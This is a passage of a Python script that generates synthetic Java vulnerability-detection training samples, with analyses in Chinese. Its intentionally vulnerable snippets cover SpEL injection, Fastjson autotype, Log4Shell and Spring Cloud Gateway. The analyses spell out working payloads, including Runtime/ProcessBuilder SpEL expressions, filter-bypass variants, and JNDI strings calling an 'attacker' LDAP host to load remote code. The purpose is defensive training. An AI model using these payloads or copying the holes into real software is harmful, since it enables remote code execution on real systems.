            "fix_suggestion": "line 9 改为使用 SimpleEvaluationContext.forReadOnlyDataBinding().build() 传入 getValue 限制危险操作",
        },
    })

    # --- SP2: StandardEvaluationContext + getValue ---
    samples.append({
        "lang": "java",
        "code": (
            "import org.springframework.expression.spel.standard.SpelExpressionParser;\n"
            "import org.springframework.expression.spel.support.StandardEvaluationContext;\n"
            "\n"
            "public class DynamicEvalService {\n"
            "    private final SpelExpressionParser parser = new SpelExpressionParser();\n"
            "\n"
            "    public Object eval(String expr, Object root) {\n"
            "        StandardEvaluationContext context = new StandardEvaluationContext(root);\n"
            "        return parser.parseExpression(expr).getValue(context, String.class);\n"
            "    }\n"
            "}"
        ),
        "analysis": (
            "分析过程：\n"
            "1. 污染源识别：line 7 eval(String expr, ...)，expr 来自 API 调用方，用户可控。\n"
            "2. 危险 sink 定位：line 9 parser.parseExpression(expr).getValue(context, String.class)，SpEL 求值。\n"
            "3. 数据流追踪：expr=T(java.lang.Runtime).getRuntime().exec('id') -> "
            "line 8 StandardEvaluationContext（允许 T() 类型引用和 new）-> "
            "line 9 getValue SpEL 求值 -> RCE。\n"
            "4. 防御检查：显式使用 StandardEvaluationContext，该上下文允许类型引用 T()、构造器 new、方法调用等危险操作。\n"
            "5. 结论：存在 CWE-917 SpEL 表达式注入，风险等级 Critical。StandardEvaluationContext 不限制危险操作。"
        ),
        "verdict": {
            "has_vulnerability": True,
            "vulnerability_type": "CWE-917 Improper Neutralization of Special Elements",
            "risk_level": "Critical",
            "source": "line 7: eval(String expr, Object root)（expr 用户可控）",
            "sink": "line 9: parser.parseExpression(expr).getValue(context, String.class)（StandardEvaluationContext 允许 T()/new 等危险操作）",
            "explanation": "expr=T(java.lang.Runtime).getRuntime().exec('id') -> line 8 StandardEvaluationContext -> line 9 getValue SpEL T() -> RCE",
            "fix_suggestion": "line 8 改为 SimpleEvaluationContext.forReadOnlyDataBinding().build() 替代 StandardEvaluationContext 限制危险操作",
        },
    })

    # --- SP3: getValue with root object ---
    samples.append({
        "lang": "java",
        "code": (
            "import org.springframework.expression.spel.standard.SpelExpressionParser;\n"
            "\n"
            "public class ConfigService {\n"
            "    private final SpelExpressionParser parser = new SpelExpressionParser();\n"
            "\n"
            "    public String resolveConfig(String expression, ConfigObject config) {\n"
            "        return parser.parseExpression(expression).getValue(config, String.class);\n"
            "    }\n"
            "}"
        ),
        "analysis": (
            "分析过程：\n"
            "1. 污染源识别：line 6 resolveConfig(String expression, ...)，expression 来自配置解析请求，用户可控。\n"
            "2. 危险 sink 定位：line 7 parser.parseExpression(expression).getValue(config, String.class)，SpEL 求值。\n"
            "3. 数据流追踪：expression=T(java.lang.Runtime).getRuntime().exec('id') -> "
            "line 7 parseExpression + getValue -> SpEL 求值 -> RCE。\n"
            "4. 防御检查：getValue(config, String.class) 内部使用默认 StandardEvaluationContext，无安全限制。\n"
            "5. 结论：存在 CWE-917 SpEL 表达式注入，风险等级 Critical。"
        ),
        "verdict": {
            "has_vulnerability": True,
            "vulnerability_type": "CWE-917 Improper Neutralization of Special Elements",
            "risk_level": "Critical",
            "source": "line 6: resolveConfig(String expression, ConfigObject config)（expression 用户可控）",
            "sink": "line 7: parser.parseExpression(expression).getValue(config, String.class)（默认 StandardEvaluationContext 无限制）",
            "explanation": "expression=T(java.lang.Runtime).getRuntime().exec('id') -> line 7 parseExpression+getValue SpEL T() -> RCE",
            "fix_suggestion": "line 7 改为使用 SimpleEvaluationContext.forReadOnlyDataBinding().build() 作为第一个参数传入 getValue 限制危险操作",
        },
    })

    # --- SP4: RuleEngine checkRule ---
    samples.append({
        "lang": "java",
        "code": (
            "import org.springframework.expression.spel.standard.SpelExpressionParser;\n"
            "\n"
            "public class RuleEngine {\n"
            "    private final SpelExpressionParser parser = new SpelExpressionParser();\n"
            "\n"
            "    public boolean checkRule(String rule, Object fact) {\n"
            "        return parser.parseExpression(rule).getValue(fact, Boolean.class);\n"
            "    }\n"
            "}"
        ),
        "analysis": (
            "分析过程：\n"
            "1. 污染源识别：line 6 checkRule(String rule, ...)，rule 来自规则配置请求，用户可控。\n"
            "2. 危险 sink 定位：line 7 parser.parseExpression(rule).getValue(fact, Boolean.class)，SpEL 求值。\n"
            "3. 数据流追踪：rule=T(java.lang.Runtime).getRuntime().exec('id') -> "
            "line 7 parseExpression + getValue -> SpEL 求值 -> RCE。\n"
            "4. 防御检查：getValue(fact, Boolean.class) 内部使用默认 StandardEvaluationContext，无安全限制。\n"
            "5. 结论：存在 CWE-917 SpEL 表达式注入，风险等级 Critical。即使期望返回 Boolean 类型，"
            "SpEL 仍会执行表达式中的副作用（如 Runtime.exec）。"
        ),
        "verdict": {
            "has_vulnerability": True,
            "vulnerability_type": "CWE-917 Improper Neutralization of Special Elements",
            "risk_level": "Critical",
            "source": "line 6: checkRule(String rule, Object fact)（rule 用户可控）",
            "sink": "line 7: parser.parseExpression(rule).getValue(fact, Boolean.class)（SpEL 求值用户输入，类型转换不阻止副作用）",
            "explanation": "rule=T(java.lang.Runtime).getRuntime().exec('id') -> line 7 parseExpression+getValue -> SpEL T() 执行 -> RCE（即使返回类型为 Boolean，副作用仍执行）",
            "fix_suggestion": "line 7 改为使用 SimpleEvaluationContext.forReadOnlyDataBinding().build() 限制 T()/new 等危险操作",
        },
    })

    # ------------------------------------------------------------------
    # 3.2 用户输入拼接进 SpEL 字符串（3 条漏洞）
    # ------------------------------------------------------------------

    # --- SP5: 字符串拼接 SpEL 表达式 ---
    samples.append({
        "lang": "java",
        "code": (
            "import org.springframework.expression.spel.standard.SpelExpressionParser;\n"
            "\n"
            "public class GreetingService {\n"
            "    private final SpelExpressionParser parser = new SpelExpressionParser();\n"
            "\n"
            "    public String greet(String name) {\n"
            "        String expression = \"'Hello, ' + '\" + name + \"'\";\n"
            "        return parser.parseExpression(expression).getValue(String.class);\n"
            "    }\n"
            "}"
        ),
        "analysis": (
            "分析过程：\n"
            "1. 污染源识别：line 6 greet(String name)，name 来自用户请求。\n"
            "2. 危险 sink 定位：line 7-8 字符串拼接 SpEL 表达式 + parser.parseExpression().getValue() 求值。\n"
            "3. 数据流追踪：name='+T(java.lang.Runtime).getRuntime().exec('id')+' -> "
            "line 7 拼接为 'Hello, '+'+T(java.lang.Runtime)...+' ' -> "
            "line 8 parseExpression + getValue -> SpEL 求值拼接后的表达式 -> T() 类型引用 -> RCE。\n"
            "4. 防御检查：用户输入通过字符串拼接进入 SpEL 表达式，未转义单引号，攻击者可闭合字符串注入 SpEL 语法。\n"
            "5. 结论：存在 CWE-917 SpEL 表达式注入，风险等级 Critical。"
        ),
        "verdict": {
            "has_vulnerability": True,
            "vulnerability_type": "CWE-917 Improper Neutralization of Special Elements",
            "risk_level": "Critical",
            "source": "line 6: greet(String name)（name 用户可控）",
            "sink": "line 7-8: \"'Hello, ' + '\" + name + \"'\" 拼接后 parser.parseExpression().getValue()（未转义单引号，可注入 SpEL）",
            "explanation": "name='+T(java.lang.Runtime).getRuntime().exec('id')+' -> line 7 拼接 SpEL 表达式 -> line 8 getValue 求值 -> T() 类型引用 -> RCE",
            "fix_suggestion": "line 7-8 不拼接用户输入到 SpEL 表达式，改为将 name 设为 root 对象后用固定表达式 \"'Hello, ' + #root\" 求值",
        },
    })

    # --- SP6: String.format 拼接 SpEL ---
    samples.append({
        "lang": "java",
        "code": (
            "import org.springframework.expression.spel.standard.SpelExpressionParser;\n"
            "\n"
            "public class MessageService {\n"
            "    private final SpelExpressionParser parser = new SpelExpressionParser();\n"
            "\n"
            "    public String format(String template, Object root) {\n"
            "        String expr = String.format(template, root.toString());\n"
            "        return parser.parseExpression(expr).getValue(String.class);\n"
            "    }\n"
            "}"
        ),
        "analysis": (
            "分析过程：\n"
            "1. 污染源识别：line 6 format(String template, ...)，template 来自用户请求，用户可控。\n"
            "2. 危险 sink 定位：line 7 String.format(template, ...) 拼接 + line 8 parser.parseExpression().getValue() 求值。\n"
            "3. 数据流追踪：template=%s+T(java.lang.Runtime).getRuntime().exec('id') -> "
            "line 7 String.format 将 root.toString() 填入 %s -> "
            "line 8 parseExpression + getValue -> SpEL 求值包含 T() 的表达式 -> RCE。\n"
            "4. 防御检查：用户输入的 template 通过 String.format 拼接后进入 SpEL 求值，无转义。\n"
            "5. 结论：存在 CWE-917 SpEL 表达式注入，风险等级 Critical。"
        ),
        "verdict": {
            "has_vulnerability": True,
            "vulnerability_type": "CWE-917 Improper Neutralization of Special Elements",
            "risk_level": "Critical",
            "source": "line 6: format(String template, Object root)（template 用户可控）",
            "sink": "line 7-8: String.format(template, ...) 后 parser.parseExpression().getValue()（拼接后 SpEL 求值）",
            "explanation": "template=%s+T(java.lang.Runtime).getRuntime().exec('id') -> line 7 String.format 拼接 -> line 8 getValue SpEL T() -> RCE",
            "fix_suggestion": "line 7-8 不使用 String.format 拼接用户输入到 SpEL，改为将 root 作为 EvaluationContext root 对象用固定模板表达式求值",
        },
    })

    # --- SP7: SpEL 模板解析 #{...} ---
    samples.append({
        "lang": "java",
        "code": (
            "import org.springframework.expression.spel.standard.SpelExpressionParser;\n"
            "import org.springframework.expression.common.TemplateParserContext;\n"
            "\n"
            "public class TemplateService {\n"
            "    private final SpelExpressionParser parser = new SpelExpressionParser();\n"
            "\n"
            "    public String render(String template, Object context) {\n"
            "        return parser.parseExpression(template, new TemplateParserContext())\n"
            "                     .getValue(context, String.class);\n"
            "    }\n"
            "}"
        ),
        "analysis": (
            "分析过程：\n"
            "1. 污染源识别：line 7 render(String template, ...)，template 来自模板渲染请求，用户可控。\n"
            "2. 危险 sink 定位：line 8-9 parser.parseExpression(template, new TemplateParserContext()).getValue()，"
            "TemplateParserContext 使用 #{...} 作为 SpEL 表达式分隔符。\n"
            "3. 数据流追踪：template=Hello #{T(java.lang.Runtime).getRuntime().exec('id')} -> "
            "line 8 parseExpression with TemplateParserContext 解析 #{...} -> "
            "line 9 getValue 求值 -> SpEL T() 类型引用 -> RCE。\n"
            "4. 防御检查：使用 TemplateParserContext，用户输入的 #{...} 会被解析为 SpEL 表达式，无安全限制。\n"
            "5. 结论：存在 CWE-917 SpEL 表达式注入，风险等级 Critical。模板中 #{...} 可被用户注入。"
        ),
        "verdict": {
            "has_vulnerability": True,
            "vulnerability_type": "CWE-917 Improper Neutralization of Special Elements",
            "risk_level": "Critical",
            "source": "line 7: render(String template, Object context)（template 用户可控）",
            "sink": "line 8-9: parser.parseExpression(template, new TemplateParserContext()).getValue()（#{...} 模板中可注入 SpEL）",
            "explanation": "template=Hello #{T(java.lang.Runtime).getRuntime().exec('id')} -> line 8 TemplateParserContext 解析 #{} -> line 9 getValue SpEL T() -> RCE",
            "fix_suggestion": "line 8-9 不使用 TemplateParserContext 解析用户输入模板，改为将 context 作为 root 对象用固定模板 \"Hello #{#root}\" 求值",
        },
    })

    # ------------------------------------------------------------------
    # 3.3 防御迷惑：简单过滤可绕过（2 条漏洞）
    # ------------------------------------------------------------------

    # --- SP8: 关键词黑名单（Runtime/exec），ProcessBuilder 绕过 ---
    samples.append({
        "lang": "java",
        "code": (
            "import org.springframework.expression.spel.standard.SpelExpressionParser;\n"
            "\n"
            "public class FilteredSpelService {\n"
            "    private final SpelExpressionParser parser = new SpelExpressionParser();\n"
            "\n"
            "    public Object safeEval(String expression) {\n"
            "        if (expression.contains(\"Runtime\") || expression.contains(\"exec\")) {\n"
            "            throw new SecurityException(\"Blocked keyword\");\n"
            "        }\n"
            "        return parser.parseExpression(expression).getValue();\n"
            "    }\n"
            "}"
        ),
        "analysis": (
            "分析过程：\n"
            "1. 污染源识别：line 6 safeEval(String expression)，expression 用户可控。\n"
            "2. 危险 sink 定位：line 10 parser.parseExpression(expression).getValue()，SpEL 求值。\n"
            "3. 数据流追踪：expression=T(java.lang.ProcessBuilder).new(new String[]{'id'}).start() -> "
            "line 7 contains 检查 Runtime/exec 不匹配（使用 ProcessBuilder 和 start）-> "
            "line 10 getValue SpEL 求值 -> T() ProcessBuilder 构造 + start() -> RCE。\n"
            "4. 防御检查：关键词黑名单仅过滤 Runtime 和 exec，未覆盖 ProcessBuilder、"
            "T(java.lang.System).exit()、T(java.lang.Thread).sleep() 等其他危险操作。黑名单方式天然不完整。\n"
            "5. 结论：存在 CWE-917 SpEL 表达式注入，风险等级 Critical。关键词黑名单可被替代类绕过。"
        ),
        "verdict": {
            "has_vulnerability": True,
            "vulnerability_type": "CWE-917 Improper Neutralization of Special Elements",
            "risk_level": "Critical",
            "source": "line 6: safeEval(String expression)（expression 用户可控）",
            "sink": "line 10: parser.parseExpression(expression).getValue()（关键词黑名单可被 ProcessBuilder 绕过）",
            "explanation": "expression=T(java.lang.ProcessBuilder).new(new String[]{'id'}).start() -> line 7 contains 检查通过（无 Runtime/exec）-> line 10 getValue SpEL T() ProcessBuilder -> RCE",
            "fix_suggestion": "line 10 改为使用 SimpleEvaluationContext.forReadOnlyDataBinding().build() 限制 T()/new 等危险操作，关键词黑名单不可靠",
        },
    })

    # --- SP9: replace T( 和 Runtime，new 操作符绕过 ---
    samples.append({
        "lang": "java",
        "code": (
            "import org.springframework.expression.spel.standard.SpelExpressionParser;\n"
            "\n"
            "public class SpelGuard {\n"
            "    private final SpelExpressionParser parser = new SpelExpressionParser();\n"
            "\n"
            "    public Object safeEval(String expression) {\n"
            "        String filtered = expression.replace(\"T(\", \"\").replace(\"Runtime\", \"\");\n"
            "        return parser.parseExpression(filtered).getValue();\n"
            "    }\n"
            "}"
        ),
        "analysis": (
            "分析过程：\n"
            "1. 污染源识别：line 6 safeEval(String expression)，expression 用户可控。\n"
            "2. 危险 sink 定位：line 7-8 replace 过滤后 parser.parseExpression(filtered).getValue() SpEL 求值。\n"
            "3. 数据流追踪：expression=new java.lang.ProcessBuilder(new String[]{'id'}).start() -> "
            "line 7 replace(\"T(\", \"\") 和 replace(\"Runtime\", \"\") 不影响此表达式 -> "
            "line 8 getValue SpEL 求值 -> SpEL new 操作符创建 ProcessBuilder + start() -> RCE。\n"
            "4. 防御检查：过滤了 T( 和 Runtime，但 SpEL 的 new 操作符不需要 T() 语法，"
            "攻击者可使用 new java.lang.ProcessBuilder(...) 绕过。\n"
            "5. 结论：存在 CWE-917 SpEL 表达式注入，风险等级 Critical。字符替换过滤不完整。"
        ),
        "verdict": {
            "has_vulnerability": True,
            "vulnerability_type": "CWE-917 Improper Neutralization of Special Elements",
            "risk_level": "Critical",
            "source": "line 6: safeEval(String expression)（expression 用户可控）",
            "sink": "line 7-8: expression.replace(\"T(\", \"\") 后 parser.parseExpression(filtered).getValue()（new 操作符可绕过 T( 过滤）",
            "explanation": "expression=new java.lang.ProcessBuilder(new String[]{'id'}).start() -> line 7 replace 不影响 -> line 8 getValue SpEL new -> RCE（防御迷惑：过滤 T( 不能阻止 new）",
            "fix_suggestion": "line 8 改为使用 SimpleEvaluationContext.forReadOnlyDataBinding().build() 同时限制 T() 和 new 操作，replace 过滤不可靠",
        },
    })

    # ------------------------------------------------------------------
    # 3.4 安全版本（1 条安全）
    # ------------------------------------------------------------------

    # --- SP10: SimpleEvaluationContext.forReadOnlyDataBinding ---
    samples.append({
        "lang": "java",
        "code": (
            "import org.springframework.expression.spel.standard.SpelExpressionParser;\n"
            "import org.springframework.expression.spel.support.SimpleEvaluationContext;\n"
            "\n"
            "public class SafeSpelService {\n"
            "    private final SpelExpressionParser parser = new SpelExpressionParser();\n"
            "    private final SimpleEvaluationContext context =\n"
            "        SimpleEvaluationContext.forReadOnlyDataBinding().build();\n"
            "\n"
            "    public Object safeEval(String expression, Object root) {\n"
            "        return parser.parseExpression(expression).getValue(context, root);\n"
            "    }\n"
            "}"
        ),
        "analysis": (
            "分析过程：\n"
            "1. 污染源识别：line 9 safeEval(String expression, ...)，expression 理论上用户可控。\n"
            "2. 危险 sink 定位：line 10 parser.parseExpression(expression).getValue(context, root)，SpEL 求值。\n"
            "3. 数据流追踪：expression=T(java.lang.Runtime).getRuntime().exec('id') -> "
            "line 6-7 SimpleEvaluationContext.forReadOnlyDataBinding() 限制 -> "
            "line 10 getValue 使用受限上下文 -> SpEL 拒绝 T() 类型引用和 new 构造 -> 抛出异常，RCE 被阻止。\n"
            "4. 防御评估：SimpleEvaluationContext.forReadOnlyDataBinding() 是 Spring 官方推荐的 SpEL 安全上下文：\n"
            "   (a) 禁止 T() 类型引用（无法访问 java.lang.Runtime 等危险类）；\n"
            "   (b) 禁止 new 构造器（无法创建 ProcessBuilder 等对象）；\n"
            "   (c) 禁止方法调用（默认不开启 withInstanceMethods）；\n"
            "   (d) 只读模式禁止赋值操作。\n"
            "5. 结论：SimpleEvaluationContext 有效限制 SpEL 危险操作，无表达式注入风险。"
        ),
        "verdict": {
            "has_vulnerability": False,
            "vulnerability_type": "none",
            "risk_level": "None",
            "source": "N/A",
            "sink": "N/A",
            "explanation": "line 6-7 SimpleEvaluationContext.forReadOnlyDataBinding() 禁止 T()/new/方法调用 -> line 10 getValue 使用受限上下文 -> SpEL 危险操作被拒绝",
            "fix_suggestion": "no fix needed",
        },
    })

    return samples


# ===========================================================================
# 4. 其他真实 CVE 场景（5 条）
# ===========================================================================
def gen_other_cve():
    """生成 5 条其他真实 CVE 样本（全部漏洞）。"""
    samples = []

    # ------------------------------------------------------------------
    # 4.1 Fastjson autotype 反序列化（2 条，CWE-502，CVE-2017-18349）
    # ------------------------------------------------------------------

    # --- OC1: JSON.parseObject with Feature.SupportAutoType ---
    samples.append({
        "lang": "java",
        "code": (
            "import com.alibaba.fastjson.JSON;\n"
            "import com.alibaba.fastjson.parser.Feature;\n"
            "\n"
            "public class JsonService {\n"
            "    public Object parse(String json) {\n"
            "        return JSON.parseObject(json, Object.class, Feature.SupportAutoType);\n"
            "    }\n"
            "}"
        ),
        "analysis": (
            "分析过程：\n"
            "1. 污染源识别：line 5 parse(String json)，json 来自 HTTP 请求体，用户完全可控。\n"
            "2. 危险 sink 定位：line 6 JSON.parseObject(json, Object.class, Feature.SupportAutoType)，"
            "开启 autotype 后 @type 字段可指定任意类。\n"
            "3. 数据流追踪：json={\"@type\":\"com.sun.rowset.JdbcRowSetImpl\","
            "\"dataSourceName\":\"ldap://attacker/exploit\",\"autoCommit\":true} -> "
            "line 6 parseObject 开启 SupportAutoType -> @type 指定 JdbcRowSetImpl -> "
            "Fastjson 实例化 JdbcRowSetImpl 并调用 setDataSourceName -> JNDI lookup -> RCE。\n"
            "4. 防御检查：显式开启 Feature.SupportAutoType，无类型白名单。\n"
            "5. 结论：存在 CWE-502 Deserialization of Untrusted Data，风险等级 Critical（CVE-2017-18349 利用模式）。"
        ),
        "verdict": {
            "has_vulnerability": True,
            "vulnerability_type": "CWE-502 Deserialization of Untrusted Data",
            "risk_level": "Critical",
            "source": "line 5: parse(String json)（HTTP 请求体 json 用户可控）",
            "sink": "line 6: JSON.parseObject(json, Object.class, Feature.SupportAutoType)（开启 autotype，@type 可指定任意类）",
            "explanation": "json={\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",...} -> line 6 parseObject SupportAutoType -> @type 指定 JdbcRowSetImpl -> JNDI lookup -> RCE（CVE-2017-18349）",
            "fix_suggestion": "line 6 移除 Feature.SupportAutoType 并设置 ParserConfig.getGlobalInstance().setAutoTypeSupport(false)，或升级 Fastjson ≥1.2.68 并启用 safeMode",
        },
    })

    # --- OC2: JSON.parse with setAutoTypeSupport(true) ---
    samples.append({
        "lang": "java",
        "code": (
            "import com.alibaba.fastjson.JSON;\n"
            "import com.alibaba.fastjson.parser.ParserConfig;\n"
            "\n"
            "public class FastjsonService {\n"
            "    public Object deserialize(String input) {\n"
            "        ParserConfig config = new ParserConfig();\n"
            "        config.setAutoTypeSupport(true);\n"
            "        return JSON.parse(input, config);\n"
            "    }\n"
            "}"
        ),
        "analysis": (
            "分析过程：\n"
            "1. 污染源识别：line 5 deserialize(String input)，input 来自 HTTP 请求，用户可控。\n"
            "2. 危险 sink 定位：line 8 JSON.parse(input, config)，config 开启了 AutoTypeSupport。\n"
            "3. 数据流追踪：input={\"@type\":\"com.sun.rowset.JdbcRowSetImpl\","
            "\"dataSourceName\":\"rmi://attacker/exploit\",\"autoCommit\":false} -> "
            "line 6-7 config.setAutoTypeSupport(true) -> line 8 JSON.parse -> "
            "@type 指定 JdbcRowSetImpl -> JNDI lookup -> RCE。\n"
            "4. 防御检查：显式 setAutoTypeSupport(true)，无类型白名单（checkAutoType 未配置 acceptList）。\n"
            "5. 结论：存在 CWE-502 Deserialization of Untrusted Data，风险等级 Critical（CVE-2017-18349）。"
        ),
        "verdict": {
            "has_vulnerability": True,
            "vulnerability_type": "CWE-502 Deserialization of Untrusted Data",
            "risk_level": "Critical",
            "source": "line 5: deserialize(String input)（HTTP 请求 input 用户可控）",
            "sink": "line 8: JSON.parse(input, config)（config.setAutoTypeSupport(true) 开启 autotype）",
            "explanation": "input={\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",...} -> line 7 setAutoTypeSupport(true) -> line 8 JSON.parse -> @type 指定 JdbcRowSetImpl -> JNDI -> RCE（CVE-2017-18349）",
            "fix_suggestion": "line 7 改为 config.setAutoTypeSupport(false) 或使用 ParserConfig.getGlobalInstance().setSafeMode(true) 禁用 autotype",
        },
    })

    # ------------------------------------------------------------------
    # 4.2 Log4j JNDI 注入（2 条，CWE-917，CVE-2021-44228 Log4Shell）
    # ------------------------------------------------------------------

    # --- OC3: Log4j 字符串拼接 ---
    samples.append({
        "lang": "java",
        "code": (
            "import org.apache.logging.log4j.LogManager;\n"
            "import org.apache.logging.log4j.Logger;\n"
            "\n"
            "public class LoginController {\n"
            "    private static final Logger logger = LogManager.getLogger(LoginController.class);\n"
            "\n"
            "    public String login(String username, String password) {\n"
            "        logger.info(\"User login attempt: \" + username);\n"
            "        if (authenticate(username, password)) {\n"
            "            return \"success\";\n"
            "        }\n"
            "        return \"failed\";\n"
            "    }\n"
            "\n"
            "    private boolean authenticate(String user, String pass) {\n"
            "        return \"admin\".equals(user) && \"secret\".equals(pass);\n"
            "    }\n"
            "}"
        ),
        "analysis": (
            "分析过程：\n"
            "1. 污染源识别：line 7 login(String username, ...)，username 来自 HTTP 登录请求，用户完全可控。\n"
            "2. 危险 sink 定位：line 8 logger.info(\"User login attempt: \" + username)，"
            "Log4j2 < 2.15.0 会对日志消息中的 ${...} 执行 JNDI lookup。\n"
            "3. 数据流追踪：username=${jndi:ldap://attacker.com/exploit} -> "
            "line 8 字符串拼接 \"User login attempt: ${jndi:ldap://...}\" -> "
            "Log4j2 解析 ${jndi:...} -> JNDI lookup 到攻击者 LDAP 服务器 -> 加载恶意 Java 类 -> RCE。\n"
            "4. 防御检查：Log4j2 版本 < 2.15.0（CVE-2021-44228），日志消息中的 ${jndi:...} 会被自动解析。\n"
            "5. 结论：存在 CWE-917 Improper Neutralization of Special Elements（JNDI 注入），风险等级 Critical（Log4Shell）。"
        ),
        "verdict": {
            "has_vulnerability": True,
            "vulnerability_type": "CWE-917 Improper Neutralization of Special Elements",
            "risk_level": "Critical",
            "source": "line 7: login(String username, String password)（username 来自 HTTP 登录请求）",
            "sink": "line 8: logger.info(\"User login attempt: \" + username)（Log4j2 < 2.15.0 对 ${jndi:...} 执行 JNDI lookup）",
            "explanation": "username=${jndi:ldap://attacker.com/exploit} -> line 8 字符串拼接后日志 -> Log4j2 解析 ${jndi:...} -> JNDI lookup -> 加载恶意类 -> RCE（CVE-2021-44228）",
            "fix_suggestion": "line 8 升级 Log4j2 至 ≥2.17.1，或设置 log4j2.formatMsgNoLookups=true 禁用 lookup，且避免字符串拼接用户输入到日志",
        },
    })

    # --- OC4: Log4j 参数化日志 ---
    samples.append({
        "lang": "java",
        "code": (
            "import org.apache.logging.log4j.LogManager;\n"
            "import org.apache.logging.log4j.Logger;\n"
            "\n"
            "public class AuditLogger {\n"
            "    private static final Logger logger = LogManager.getLogger(AuditLogger.class);\n"
            "\n"
            "    public void logUserAgent(String userAgent) {\n"
            "        logger.info(\"Request User-Agent: {}\", userAgent);\n"
            "    }\n"
            "\n"
            "    public void logAction(String action, String userId) {\n"
            "        logger.info(\"User {} performed action: {}\", userId, action);\n"
            "    }\n"
            "}"
        ),
        "analysis": (
            "分析过程：\n"
            "1. 污染源识别：line 7 logUserAgent(String userAgent)，userAgent 来自 HTTP User-Agent 头，用户可控。\n"
            "2. 危险 sink 定位：line 8 logger.info(\"Request User-Agent: {}\", userAgent)，"
            "Log4j2 < 2.15.0 即使使用参数化日志 {}，替换后的消息仍会执行 ${jndi:...} lookup。\n"
            "3. 数据流追踪：userAgent=${jndi:ldap://attacker.com/exploit} -> "
            "line 8 logger.info 参数化替换为 \"Request User-Agent: ${jndi:ldap://...}\" -> "
            "Log4j2 对替换后的消息执行 lookup -> JNDI lookup -> RCE。\n"
            "4. 防御检查：虽然使用参数化日志（{} 占位符），但 Log4j2 < 2.15.0 在消息格式化后仍执行 lookup，"
            "参数化日志不能防止 Log4Shell。这是常见的防御迷惑点。\n"
            "5. 结论：存在 CWE-917 Improper Neutralization of Special Elements（JNDI 注入），风险等级 Critical（CVE-2021-44228）。"
        ),
        "verdict": {
            "has_vulnerability": True,
            "vulnerability_type": "CWE-917 Improper Neutralization of Special Elements",
            "risk_level": "Critical",
            "source": "line 7: logUserAgent(String userAgent)（HTTP User-Agent 头用户可控）",
            "sink": "line 8: logger.info(\"Request User-Agent: {}\", userAgent)（Log4j2 < 2.15.0 参数化日志仍执行 ${jndi:...} lookup）",
            "explanation": "userAgent=${jndi:ldap://attacker.com/exploit} -> line 8 logger.info {} 替换 -> Log4j2 对替换后消息执行 ${jndi:...} lookup -> RCE（CVE-2021-44228，参数化日志不能防 Log4Shell）",
            "fix_suggestion": "line 8: 应改为升级 Log4j2 至 ≥2.17.1，或设置 log4j2.formatMsgNoLookups=true 禁用 lookup，参数化日志不能替代版本升级",
        },
    })

    # ------------------------------------------------------------------
    # 4.3 Spring Cloud Gateway Actuator SpEL 注入（1 条，CWE-917，CVE-2022-22947）
    # ------------------------------------------------------------------

    # --- OC5: Gateway PredicateEvaluator SpEL ---
    samples.append({
        "lang": "java",
        "code": (
            "import org.springframework.cloud.gateway.handler.predicate.PredicateDefinition;\n"
            "import org.springframework.expression.spel.standard.SpelExpressionParser;\n"
            "\n"
            "public class GatewayPredicateEvaluator {\n"
            "    private final SpelExpressionParser parser = new SpelExpressionParser();\n"
            "\n"
            "    public Object evaluatePredicate(PredicateDefinition predicate) {\n"
            "        String expression = predicate.getArgs().get(\"_genkey_0\");\n"
            "        return parser.parseExpression(expression).getValue();\n"
            "    }\n"
            "}"
        ),
        "analysis": (
            "分析过程：\n"
            "1. 污染源识别：line 7 evaluatePredicate(PredicateDefinition predicate)，"
            "predicate 来自 Actuator API 请求体（POST /actuator/gateway/routes），用户可控。\n"
            "2. 危险 sink 定位：line 9 parser.parseExpression(expression).getValue()，"
            "对 Actuator 传入的 predicate 参数做 SpEL 求值。\n"
            "3. 数据流追踪：Actuator POST /actuator/gateway/routes 请求体含 "
            "predicate args _genkey_0=T(java.lang.Runtime).getRuntime().exec('id') -> "
            "line 8 predicate.getArgs().get(\"_genkey_0\") 获取 -> "
            "line 9 parseExpression + getValue -> SpEL T() 类型引用 -> RCE。\n"
            "4. 防御检查：Actuator 端点未授权访问 + SpEL 求值使用默认 StandardEvaluationContext 无限制。\n"
            "5. 结论：存在 CWE-917 Improper Neutralization of Special Elements（SpEL 注入），"
            "风险等级 Critical（CVE-2022-22947 Spring Cloud Gateway Actuator API SpEL 注入）。"
        ),
        "verdict": {
            "has_vulnerability": True,
            "vulnerability_type": "CWE-917 Improper Neutralization of Special Elements",
            "risk_level": "Critical",
            "source": "line 7: evaluatePredicate(PredicateDefinition predicate)（Actuator API 请求体 predicate 用户可控）",
            "sink": "line 9: parser.parseExpression(expression).getValue()（对 Actuator 传入参数做 SpEL 求值，默认 StandardEvaluationContext 无限制）",
            "explanation": "Actuator POST /actuator/gateway/routes -> predicate args _genkey_0=T(java.lang.Runtime).getRuntime().exec('id') -> line 8 获取 -> line 9 getValue SpEL T() -> RCE（CVE-2022-22947）",
            "fix_suggestion": "line 9 改为使用 SimpleEvaluationContext.forReadOnlyDataBinding().build() 限制 SpEL 危险操作，并限制 Actuator 端点访问权限（仅内网/认证访问）",
        },
    })

    return samples


# ===========================================================================
# 验证与统计
# ===========================================================================
def verify_and_stats(filepath):
    """验证输出文件并打印统计信息。"""
    print("\n" + "=" * 60)
    print("验证输出")
    print("=" * 60)

    with open(filepath, encoding="utf-8") as f:
        lines = [l for l in f if l.strip()]

    errors = []
    cwe_counter = Counter()
    lang_counter = Counter()
    vuln_count = 0
    safe_count = 0
    src_anchored = 0
    sink_anchored = 0
    fix_anchored = 0

    for idx, line in enumerate(lines, 1):
        # 1. 合法 JSON
        try:
            obj = json.loads(line)
        except json.JSONDecodeError as e:
            errors.append(f"行 {idx}: JSON 解析失败 - {e}")
            continue

        # 2. messages 结构
        messages = obj.get("messages", [])
        if len(messages) != 3:
            errors.append(f"行 {idx}: messages 数量为 {len(messages)}，期望 3")
            continue
        roles = [m["role"] for m in messages]
        if roles != ["system", "user", "assistant"]:
            errors.append(f"行 {idx}: roles 为 {roles}")
            continue

        # 3. assistant content 包含可解析的 ```json 块
        assistant_content = messages[2]["content"]
        json_blocks = re.findall(r"```json\s*(\{.*?\})\s*```", assistant_content, re.DOTALL)
        if not json_blocks:
            errors.append(f"行 {idx}: 未找到 ```json 块")
            continue
        verdict = None
        for block in json_blocks:
            try:
                verdict = json.loads(block)
                break
            except json.JSONDecodeError:
                continue
        if verdict is None:
            errors.append(f"行 {idx}: JSON 块无法解析")
            continue

        # 4. 字段完整性
        required_fields = {"has_vulnerability", "vulnerability_type", "risk_level",
                           "source", "sink", "explanation", "fix_suggestion"}
        missing = required_fields - set(verdict.keys())
